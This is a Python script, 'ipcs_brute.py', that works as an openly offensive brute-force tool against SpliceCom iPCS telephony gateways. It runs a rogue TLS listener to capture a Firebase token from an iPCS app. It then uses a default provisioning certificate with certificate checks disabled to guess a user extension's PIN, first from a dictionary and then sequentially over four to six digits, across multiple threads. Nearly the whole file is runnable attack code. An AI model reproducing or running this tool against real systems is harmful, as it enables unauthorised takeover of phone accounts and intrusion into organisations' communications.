import socket
import ssl
import binascii
import time
import sys
import logging
import argparse
import threading
from queue import Queue

def token_thread(e_terminate):
    global TOKEN
    server_address = ('', 5000)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(server_address)
    server_socket.listen(1)
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(certfile='default.pem', keyfile='default.pem')

    logger.warning("** We need to capture a firebase token. Configure an iPCS App to point to the IP of this system on port 5000. Use any value for user and password. **")
    logger.warning("Waiting for a connection... CTRL+C to abort")
    while not e_terminate.is_set():
        try:
          server_socket.settimeout(1.0)
          client_socket, client_address = server_socket.accept()
          server_socket.settimeout(None)
        except socket.timeout:
            continue
        except e:
            logger.error(f"Socket Error: {e}")

        try:
            ssl_client_socket = ssl_context.wrap_socket(client_socket, server_side=True)
            logger.debug(f"Got connection from {client_address}")
            data = ssl_client_socket.recv(1024)
            while data:
                msg = data.decode()
                if msg[:5] == "LOGIN":
                  parts = msg.split(",")
                  if (len(parts)) == 10:
                    logger.debug(f"Got LOGIN message containing token")
                    TOKEN = parts[9].strip()
                    e_terminate.set()
                    break

                data = ssl_client_socket.recv(1024)

        except socket.timeout:
            pass
        except ssl.SSLError as e:
            logger.error(f"SSL Error: {e}")

        finally:
            ssl_client_socket.close()


def login_thread(e_terminate, i_thread, q_pin):
    global CRACKED

    logger.debug(f"login_thread({i_thread}) is up")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_context.set_ciphers('DEFAULT@SECLEVEL=1') 
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_sock = ssl_context.wrap_socket(sock, server_hostname=SERVER)
    ssl_context.load_cert_chain(certfile='sslprov.pem', keyfile='sslprov.pem')
    iphex = binascii.hexlify(socket.inet_aton(SERVER))

    try:
        ssl_sock.connect((SERVER, int(PORT)))
    except socket.error as e:
        logger.error(f"login_thread({i_thread}) error connecting to {SERVER}:{PORT}: {e}")
        if type(e) == ssl.SSLError:
           logger.error(f"login_thread({i_thread}) This may indicate the remote system is patched and doesn't accept the default provisioning cert")
        e_terminate.set()
    else:
        try:
            peer_address = ssl_sock.getpeername()
            logger.debug(f"login_thread({i_thread}) connected to {peer_address}")
            while not e_terminate.is_set():
              if q_pin.empty():
                  time.sleep(0.01)
              else:
                  thiscode = q_pin.get()
                  time.sleep(DELAY)
                  logger.info(f"login_thread({i_thread}) TRYING {thiscode}")
                  ssl_sock.sendall(b'LOGIN,%d,%s,1234,iPCS 2.7.2,75,00000000-0000-0000-0000-000000000000,73,%s,%s\n' % (USER, thiscode.encode('ascii'), iphex, TOKEN.encode('ascii')))
                  data = ssl_sock.recv(4096)
                  msg = data.decode()
                  logger.debug(f"login_thread({i_thread}) GOT RESPONSE: {msg.strip()}")
                  if msg[:4] == "USER":
                      logger.debug(f"login_thread({i_thread}) PASSWORD FOUND {thiscode}")
                      CRACKED = thiscode
                      e_terminate.set()
                      break
                  elif msg[:3] == "NOT":
                    logger.debug(f"login_thread({i_thread}) PASSWORD REJECTED {thiscode}")
                  else:
                    logger.error(f"login_thread({i_thread}) UNHANDLED MESSAGE. IS THIS A SPLICECOM GATEWAY?")
                    e_terminate.set()
                    break

        except socket.error as e:
          logger.error(f"login_thread({i_thread}) socket error {e}")
        finally:
          ssl_sock.close()
          e_terminate.set()

    logger.debug(f"login_thread({i_thread}) is ending")


logger = logging.getLogger(__name__)
logging.basicConfig(
    format="%(asctime)s %(message)s",
    handlers=[
        logging.StreamHandler()
    ]
)

speeds = {"fast": 0.01, "medium": 0.1, "slow": 0.5}
levels = {1: logging.WARNING, 2: logging.INFO, 3: logging.DEBUG}

parser = argparse.ArgumentParser("ipcs_brute.py")
parser.add_argument("--server", help="The IP:Port of a splicecom SSL gateway, e.g. 1.2.3.4:5000", type=str, required=True, metavar="IP[:PORT]")
parser.add_argument("--user", help="The user account (extension) to brute force, e.g. 2001", type=int, required=True)
parser.add_argument("--speed", help="How aggressively to brute force", type=str, default="fast", choices=['fast', 'medium', 'slow'], required=False)
parser.add_argument("--token", help="A firebase messaging token. Can be left blank to run local capture server", type=str, default="", required=False)
parser.add_argument("--threads", help="Number of brute force threads", type=int, default=3, required=False, choices=range(1,9),  metavar="1-8")
parser.add_argument("--loglevel", help="Log level (1 = least verbose)", type=int, default="1", required=False, choices=[1, 2, 3])
args = parser.parse_args()

parts = args.server.split(":")
SERVER, PORT = args.server.split(":") if ":" in args.server else (args.server, 5000)
USER =  args.user
DELAY = speeds[args.speed]
TOKEN = args.token
THREADS = args.threads
logger.setLevel(levels[args.loglevel])

logger.warning("ipcs brute forcer 1.0 loaded")
terminate_e = threading.Event()

if not TOKEN:
  logger.warning("No token supplied. Starting token collection server")
  server_thread = threading.Thread(target=token_thread, args=(terminate_e,))
  server_thread.start()
  while not terminate_e.is_set():
    try:
      time.sleep(0.1)
    except KeyboardInterrupt:
      terminate_e.set()
      break
    
  if not TOKEN:
    logger.error("Cannot continue without a firebase token. Please try again")
    sys.exit()

  logger.warning(f"Got firebase token: {TOKEN}")
  try:
    input("Press enter to continue with the brute force or exit with CTRL+C\n")
  except KeyboardInterrupt:
    sys.exit()

terminate_e.clear()
CRACKED = False

try:
  with open('dictionary.txt', 'r') as f:
    dictionary = [line.strip() for line in f]
except FileNotFoundError:
    dictionary = []

logger.info("Loaded %d PINs from dictionary.txt" % len(dictionary))

start_time = time.time()
last_update = start_time
pin_q = Queue(maxsize=THREADS)
login_threads = []
logger.debug("Starting {THREADS} threads")
for i in range(THREADS):
  t = threading.Thread(target=login_thread, args=(terminate_e, i, pin_q))
  login_threads.append(t)
  t.start()

logger.warning("Trying PINs from dictionary. CTRL+C to abort.")
tried = 0
for thispass in dictionary:
  while not terminate_e.is_set():
    try:
      if time.time() - last_update >= 10:
        logger.warning(f"Tried {tried} PINs")
        last_update = time.time()
      pin_q.put(thispass, block=True, timeout=1)
      tried += 1
      break
    except KeyboardInterrupt:
      terminate_e.set()
      break
    except:
      pass

if not CRACKED:
  logger.warning("Attempting sequential brute force. CTRL+C to abort.")
  for length in range(4, 7):
    min_value = int("0" * (length - 1) + "1")
    max_value = int("9" * length)

    for value in range(min_value, max_value):
      thispass = "{:0{length}}".format(value, length=length)
      if thispass not in dictionary:
        while not terminate_e.is_set():
          try:
            if time.time() - last_update >= 10:
               logger.warning(f"Tried {tried} PINs")
               last_update = time.time()
            pin_q.put(thispass, block=True, timeout=1)
            tried += 1
            break
          except KeyboardInterrupt:
            terminate_e.set()
            break
          except:
            pass

if CRACKED:
   logger.warning(f"** Found PIN: {CRACKED} **")
else:
   terminate_e.set()
   logger.warning(f"** PIN Not Found :( **")

execution_time = time.time() - start_time
logger.warning(f"Time elapsed: {execution_time:.5f} seconds, tried {tried} PINs")
